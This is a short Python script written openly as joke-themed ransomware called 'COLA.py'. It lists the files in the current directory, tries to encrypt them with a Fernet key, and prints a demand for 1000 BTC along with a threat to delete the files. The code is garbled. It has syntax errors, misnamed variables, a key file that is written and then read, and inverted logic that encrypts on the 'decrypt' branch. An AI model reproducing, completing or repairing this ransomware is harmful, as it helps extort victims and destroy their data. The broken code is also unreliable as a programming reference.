#!/ur/bin/env python3
 import os
 import cryptography.fernet 
 import fernet
 files[]

 for files in os.listdir():
 	 if file == "COLA.py" or file == "thekey.key"
 	 	   continue
 	 if os.path.isfile(file):
 	 	   files.append()

print(files)

ket = Fernet.generate_key()

with open("thekey.key". "wb") as key:
       secretkey = key.read()

secretphrase = "Cola_better_than_pepsi"
user_phrase = input("Enter the secret phrase to decrypt your files\n")

if user_phrase == secretphrase:
         for file in files:
	              with open(file,"rb") as thefile:
	                     contents = thefile.read()
	                     contents_encrypted = Fernet(key).encrypt(contents)
	              with open(file,"wb") as thefile:
	                     thefile.write(content_encrypted)
	              print("congrats, your files are decrypted. Drink Cola and hack")

else:
        print("It looks like you are pepsi lover :(, sorry can't decrypt! Sebd more BTC Now :)")	              

print("All of your files have been encrypted !! Send me 1000 BTC or I'll delete them in 24 hrs.")